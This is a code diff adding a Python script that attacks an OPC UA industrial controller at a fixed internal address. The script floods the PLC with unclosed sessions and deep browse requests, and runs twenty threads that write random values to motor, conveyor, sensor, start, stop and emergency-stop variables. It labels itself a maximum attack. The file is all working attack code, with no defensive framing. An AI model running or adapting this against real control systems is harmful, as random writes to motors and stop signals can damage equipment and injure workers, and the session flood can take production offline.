@@ -1,0 +1,75 @@
+from opcua import Client
+import threading
+import time
+import random
+
+# Configuración del PLC
+PLC_ENDPOINT = "opc.tcp://10.10.10.53:4840"
+
+VARIABLES = [
+    "ACIL_STOP", "DONER_MOTOR_1", "DONER_MOTOR_2", "DONER_MOTOR_3",
+    "GRI_BANT", "GRI_SENSOR", "MAVI_BANT", "MAVI_SENSOR",
+    "MOTOR_1", "MOTOR_3", "MOTOR_4", "MOTOR_5", "MOTOR_6",
+    "SISTEM", "START", "STOP",
+    "YAN_DONER_1", "YAN_DONER_2", "YAN_DONER_3",
+    "YESIL_BANT", "YESIL_SENSOR"
+]
+
+DURATION = 90       # segundos (puedes subirlo)
+SESSIONS = 200      # conexiones simultáneas
+WRITER_THREADS = 20 # hilos de escritura
+
+start_time = time.time()
+
+def write_loop():
+    try:
+        client = Client(PLC_ENDPOINT)
+        client.connect()
+        while time.time() - start_time < DURATION:
+            for var in VARIABLES:
+                try:
+                    node = client.get_node(f"ns=4;s=|var|{var}")
+                    node.set_value(random.choice([True, False]))
+                except:
+                    pass
+    except:
+        pass
+
+def session_flood():
+    connections = []
+    while time.time() - start_time < DURATION:
+        try:
+            c = Client(PLC_ENDPOINT)
+            c.connect()
+            connections.append(c)  # nunca se cierran
+        except:
+            break
+
+def recursive_browse():
+    try:
+        client = Client(PLC_ENDPOINT)
+        client.connect()
+        root = client.get_root_node()
+        while time.time() - start_time < DURATION:
+            for obj in root.get_children():
+                for child in obj.get_children():
+                    for grandchild in child.get_children():
+                        for node in grandchild.get_children():
+                            _ = node.get_browse_name()
+    except:
+        pass
+
+# Lanzar ataques en paralelo
+for _ in range(WRITER_THREADS):
+    threading.Thread(target=write_loop).start()
+
+for _ in range(5):
+    threading.Thread(target=recursive_browse).start()
+
+threading.Thread(target=session_flood).start()
+
+# Esperar
+while time.time() - start_time < DURATION:
+    pass
+
+print(f"[✔] Ataque máximo ejecutado durante {DURATION} segundos.")
